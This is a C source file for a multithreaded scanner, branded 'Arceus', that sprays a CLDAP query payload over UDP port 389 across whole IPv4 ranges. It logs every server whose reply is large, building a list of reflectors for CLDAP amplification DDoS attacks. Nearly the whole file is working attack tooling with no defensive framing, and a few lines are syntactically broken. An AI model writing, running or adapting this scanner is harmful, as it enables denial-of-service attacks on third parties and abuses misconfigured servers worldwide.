/* 
heck you!
*/

#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <math.h>
#include <ctype.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

volatile int running_threads = 0;
volatile int found_srvs = 0;
volatile unsigned long per_thread = 0;
volatile unsigned long start = 0;
volatile unsigned long scanned = 0;
volatile int sleep_between = 0;
volatile int bytes_sent = 0;
volatile unsigned long hosts_done = 0;
FILE *fd;
char payload[] =
"\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00";

size = sizeof(payload);

void *flood(void *par1)
{
    running_threads++;
    int thread_id = (int)par1;
    unsigned long start_ip = htonl(ntohl(start)+(per_thread*thread_id));
    unsigned long end = htonl(ntohl(start)+(per_thread*(thread_id+1)));
    unsigned long w;
    int y;
    unsigned char buf[65536];
    memset(buf, 0x01, 51);
    int sizeofpayload = 51;
    int sock;
    if((sock=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP))<0) {
        perror("cant open socket");
        exit(-1);
    }
    for(w=ntohl(start_ip);w<htonl(end);w++)
    {
        struct sockaddr_in servaddr;
        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr=htonl(w);
        servaddr.sin_port=htons(389);
        sendto(sock,payload,size,0, (struct sockaddr *)&servaddr,sizeof(servaddr));
        bytes_sent+=size;
        scanned++;
        hosts_done++;
    }
    close(sock);
    running_threads--;
    return;
}

void sighandler(int sig)
{
    fclose(fd);
    printf("\n");
    exit(0);
}

void *recievethread()
{
    printf("\n");
    int saddr_size, data_size, sock_raw;
    struct sockaddr_in saddr;
    struct in_addr in;

    unsigned char *buffer = (unsigned char *)malloc(65536);
    sock_raw = socket(AF_INET , SOCK_RAW , IPPROTO_UDP);
    if(sock_raw < 0)
    {
        printf("Socket Error\n");
        exit(1);
    }
    while(1)
    {
        saddr_size = sizeof saddr;
        data_size = recvfrom(sock_raw , buffer , 65536 , 0 , (struct sockaddr *)&saddr , &saddr_size);
        if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            exit(1);
        }
        struct iphdr *iph = (struct iphdr*)buffer;
        if(iph->protocol == 17)
        {
            unsigned short iphdrlen = iph->ihl*4;
            struct udphdr *udph = (struct udphdr*)(buffer + iphdrlen);
            unsigned char* payload = buffer + iphdrlen + 51;
            if(ntohs(udph->source) == 389)
            {
                int body_length = data_size - iphdrlen - 51;
                if (body_length > 40)
                {
                found_srvs++;
                fprintf(fd,"%s %d\n",inet_ntoa(saddr.sin_addr),body_length);
                fflush(fd);
                }
            }
        }
    }
    close(sock_raw);
}
int main(int argc, char *argv[ ])
{
    if(argc < 6){
    fprintf(stderr, "\e[38;5;202mInput Error.\n");
    fprintf(stdout, "\e[38;5;202mRun the following:\x1b[1;35m %s 1.0.0.0 255.255.255.255 ldap.txt 2 1ms\n", argv[0]);
    exit(-1);
    }
    fd = fopen(argv[3], "a");
    sleep_between = atoi(argv[5]);
    signal(SIGINT, &sighandler);
    int threads = atoi(argv[4]);
    pthread_t thread;
    pthread_t listenthread;
    pthread_create( &listenthread, NULL, &recievethread, NULL);
    char *str_start = malloc(18);
    memset(str_start, 0, 18);
    str_start = argv[1];
    char *str_end = malloc(18);
    memset(str_end, 0, 18);
    str_end = argv[2];
    start = inet_addr(str_start);
    per_thread = (ntohl(inet_addr(str_end)) - ntohl(inet_addr(str_start))) / threads;
    unsigned long toscan = (ntohl(inet_addr(str_end)) - ntohl(inet_addr(str_start)));
    int i;
    for(i = 0;i<threads;i++){
        pthread_create( &thread, NULL, &flood, (void *) i);
    }
    sleep(1);
    printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mStarting LDAP Scan\n");
    char *temp = (char *)malloc(17);
    memset(temp, 0, 17);
    sprintf(temp, "\e[38;5;202mFound\e[38;5;93m");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "\e[38;5;202mIP/s\e[38;5;93m");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "\e[38;5;202mBytes/s\e[38;5;93m");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "\e[38;5;202mThreads\e[38;5;93m");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "\e[38;5;202mPercent Done\e[38;5;93m");
    printf("%s", temp);
    printf("\n");
    char *new;
    new = (char *)malloc(16*6);
    while (running_threads > 0)
    {
        printf("\r");
        memset(new, '\0', 16*6);
        sprintf(new, "%s|%-15lu", new, found_srvs);
        sprintf(new, "%s|%-15d", new, scanned);
        sprintf(new, "%s|%-15d", new, bytes_sent);
        sprintf(new, "%s|%-15d", new, running_threads);
        memset(temp, 0, 17);
        int percent_done=((double)(hosts_done)/(double)(toscan))*100;
        sprintf(temp, "%d%%", percent_done);
        sprintf(new, "%s|%s", new, temp);
        printf("%s", new);
        fflush(stdout);
        bytes_sent=0;
        scanned = 0;
        sleep(1);
    }
    printf("\n");
    fclose(fd);
    return 0;
}
